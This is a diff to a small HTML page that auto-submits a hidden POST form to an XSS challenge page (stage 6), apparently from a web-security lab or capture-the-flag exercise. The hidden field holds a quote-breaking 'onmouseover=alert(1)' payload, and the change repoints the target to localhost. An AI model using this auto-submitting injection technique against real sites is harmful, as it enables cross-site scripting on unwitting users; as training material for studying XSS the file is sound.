@@ -1,8 +1,8 @@
 <html>
 	<head></head>
 	<body onload="document.forms[0].submit()">
-	   <form method="post" action="http://172.24.228.10/challenge/XSS/stage6.php">
-		<input type="hidden" name="_" value='aaaa" onmouseover=alert(1) id="roman'>
+	   <form method="post" action="http://127.0.0.1/challenge/XSS/stage6.php">
+		<input type="hidden" name="_" value='aaaa" onmouseover="alert(1)'>
 	   </form>
 	</body>
 </html>
